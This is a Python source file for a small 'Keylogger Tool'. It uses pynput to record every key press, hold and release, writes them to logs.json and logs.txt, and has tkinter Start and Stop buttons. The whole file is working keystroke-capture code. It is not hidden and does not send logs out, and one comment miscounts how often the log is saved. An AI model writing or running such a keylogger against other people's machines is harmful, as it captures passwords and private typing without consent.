from pynput import keyboard
import tkinter as tk
from tkinter import *
import json

# GUI Sstup
root = tk.Tk()
root.geometry("420x180")
root.title("Keylogger Project")
root.configure(bg="#1e1e1e")

# global variables
key_list = []
is_held = False
key_strokes = ""
listener = None

#### File operations

# writes list of key actions to JSON file
def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def update_txt_file(key_string):
    # writes raw key string to plain text file
    with open('logs.txt', 'w') as f:
        f.write(key_string)

#### keyboard event handling

# triggered when key is pressed down 
def on_press(key):
    global is_held, key_list
    #identify fresh press or repeated 'held' signal
    state = "Held" if is_held else "Pressed"
    key_list.append({state: f'{key}'})
    
    if not is_held:
        is_held = True
    
    # Only update file every 10 keystrokes to save performance
    if len(key_list) % 5 == 0:
        update_json_file(key_list)

# triggered when a key is released 
def on_release(key):
    global is_held, key_list, key_strokes
    key_list.append({'Released': f'{key}'})

    # reset the "held" value
    is_held = False
    
    #add key to .txt log
    key_strokes += str(key)
    
    # Update files on release
    update_json_file(key_list)
    update_txt_file(key_strokes)

#### Button commands

def start_task():
    global listener
    if listener is None:
        print("[+] Keylogger Started...")
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        start_btn.config(state=DISABLED) # Prevent multiple listeners
        stop_btn.config(state=NORMAL)

def stop_task():
    global listener
    if listener is not None:
        print("[!] Keylogger Stopped. Saving final logs...")
        listener.stop()
        listener = None
        start_btn.config(state=NORMAL)
        stop_btn.config(state=DISABLED)
    root.destroy()

# UI Elements
title_label = Label(root, text="Keylogger Tool", font='Verdana 16 bold', bg="#1e1e1e", fg="white", padx=20, pady=15)
title_label.grid(row=0, column=0, columnspan=2, pady=(20,10))

start_btn = Button(root, text="Start", command=start_task, font=("Verdana", 11, "bold"), bg="#2e8b57", fg="white", width=15)
start_btn.grid(row=1, column=0, padx=15, pady=20)

stop_btn = Button(root, text="Stop", command=stop_task, font=("Verdana", 11, "bold"), bg="#b22222", fg="white", width=15, state=DISABLED)
stop_btn.grid(row=1, column=1, padx=15, pady=20)

root.mainloop()